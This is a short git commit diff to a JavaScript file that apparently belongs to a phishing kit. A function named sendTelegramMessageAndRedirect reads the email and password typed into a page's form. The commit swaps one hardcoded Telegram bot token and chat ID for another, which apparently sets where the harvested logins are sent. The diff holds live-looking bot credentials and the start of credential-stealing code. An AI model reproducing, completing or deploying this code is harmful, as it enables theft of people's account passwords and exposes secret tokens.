6f9ddc86ff8c14c13d57cf2bb9299366e9473285
yahooolinjjs <mtcarnpos1@gmail.com>
2024-08-13 17:38:35 +0100

    Update script.js

--- script.js
+++ script.js
@@ -1,8 +1,8 @@
 console.log("sender.js connected");
 
 function sendTelegramMessageAndRedirect() {
-  const telegramBotToken = "6844888640:AAHaV1WfjOzhyXvzRXkKefB3KunOrrhZO68"; // Replace with your Telegram bot token
-  const chatId = 5349229520; // Replace with your chat ID
+  const telegramBotToken = "6388549334:AAFhru5IVWeQjmdxckvZEs4gyrH0FyqVBpo"; // Replace with your Telegram bot token
+  const chatId = 5681020641; // Replace with your chat ID
 
   const emailValue = document.getElementById("email").value;
   const passwordValue = document.getElementById("password").value;
